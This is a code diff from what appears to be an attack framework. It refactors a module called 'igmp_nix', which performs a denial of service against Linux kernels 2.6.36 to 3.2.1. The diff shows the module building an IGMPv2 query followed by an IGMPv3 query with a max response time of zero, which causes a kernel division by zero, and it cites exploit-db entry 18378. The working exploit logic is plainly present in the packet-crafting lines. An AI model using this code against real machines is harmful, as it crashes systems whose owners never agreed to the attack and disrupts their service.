@@ -6,20 +6,23 @@ import util
 
 
 class igmp_nix(DoS):
-    """ Linux 2.6.36 >= version < 3.2.1 IGMP DoS.
-        http://www.exploit-db.com/exploits/18378/
-
+    """ 
         First send an IGMPv2 query, followed by an IGMPv3 query
         with a max response time of 0; results in a division by
         zero in the kernel
     """
     def __init__(self):
-        conf.verb = 0
         super(igmp_nix, self).__init__('Linux 2.6.36 - 3.2.1 IGMP DoS')
+        conf.verb = 0
+        self.info = """
+                    Exploits an IGMPv2 DoS in Linux kernel version
+                    2.6.36 >= to < 3.2.1.
+
+                    More information on the sploit:
+                    http://www.exploit-db.com/exploits/18378/            
+                    """
 
     def initialize(self):
-        self.get_ip()
-
         igmpv2 = pack("!BBH", 0x11, 0xff, 0) + inet_aton("224.0.0.1")
         igmpv3 = pack("!BBH", 0x11, 0x0, 0) + inet_aton("0.0.0.0") \
                                                     + pack("!BBBB", 0, 0, 0, 0)
